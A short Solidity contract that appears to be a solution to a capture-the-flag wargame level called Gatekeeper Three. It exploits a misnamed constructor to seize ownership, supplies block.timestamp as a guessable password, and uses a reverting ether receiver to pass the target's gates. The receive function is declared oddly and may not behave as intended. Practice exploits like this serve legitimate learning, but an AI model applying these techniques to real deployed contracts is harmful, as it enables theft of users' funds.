pragma solidity ^0.8.0;

import "../lv28_gatekeeper_three.sol";

contract GatekeeperThreeAttacker {
    GatekeeperThree target;

    constructor(address _target) {
        target = GatekeeperThree(payable(_target));
    }

    function bypassGate1() public {
        target.construct0r();
    }

    function bypassGate2() public {
        target.createTrick();
        target.getAllowance(block.timestamp);
    }

    function bypassGate3() public payable {
        bool sent = payable(address(target)).send(msg.value);
        if (!sent) {
            revert("Failed to send ether");
        }
    }

    function enter () public {
        target.enter();
    }

    function receive() public payable {
        revert("I don't want your money");
    }

}